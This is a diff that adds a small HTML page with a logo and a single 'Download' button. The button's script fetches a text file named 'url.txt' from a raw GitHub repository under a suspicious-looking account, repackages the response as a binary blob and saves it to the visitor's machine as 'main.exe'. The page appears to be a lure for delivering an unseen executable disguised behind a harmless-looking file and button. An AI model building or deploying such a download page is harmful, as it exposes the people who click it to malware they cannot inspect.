@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Download Button</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        #header {
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        #logo {
+            width: 12.5%; /* Scale the logo down to 12.5% of its original size */
+            height: auto;
+            margin: 10px; /* Add some spacing around the logo */
+        }
+
+        #downloadButton {
+            background-color: white;
+            border: 5px solid red; /* 5px wide red border */
+            color: red;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: border-width 0.3s, transform 0.3s, color 0.3s;
+            border-radius: 5px;
+        }
+
+        #downloadButton:hover {
+            transform: scale(1.05); /* Slightly scale up the button on hover */
+        }
+
+        #downloadButton:active {
+            transform: scale(0.95); /* A simple click effect */
+        }
+    </style>
+</head>
+<body>
+    <div id="header">
+        <img id="logo" src="https://cdn1.frocdn.ch/a8V3TWKR2cL1pxf.png" alt="Logo">
+    </div>
+    <button id="downloadButton">Download</button>
+
+    <script>
+        document.getElementById("downloadButton").addEventListener("click", function() {
+            // Send a fetch GET request to the specified URL
+            fetch("https://raw.githubusercontent.com/yes-nikeisfake0/smth/main/url.txt")
+                .then(response => response.text())
+                .then(data => {
+                    // Create a blob from the fetched data
+                    const blob = new Blob([data], { type: 'application/octet-stream' });
+
+                    // Create a temporary anchor element for downloading
+                    const a = document.createElement('a');
+                    a.href = window.URL.createObjectURL(blob);
+                    a.download = 'main.exe';
+
+                    // Trigger a click event to initiate the download
+                    a.click();
+                })
+                .catch(error => {
+                    console.error("Error fetching URL:", error);
+                });
+        });
+    </script>
+</body>
+</html>
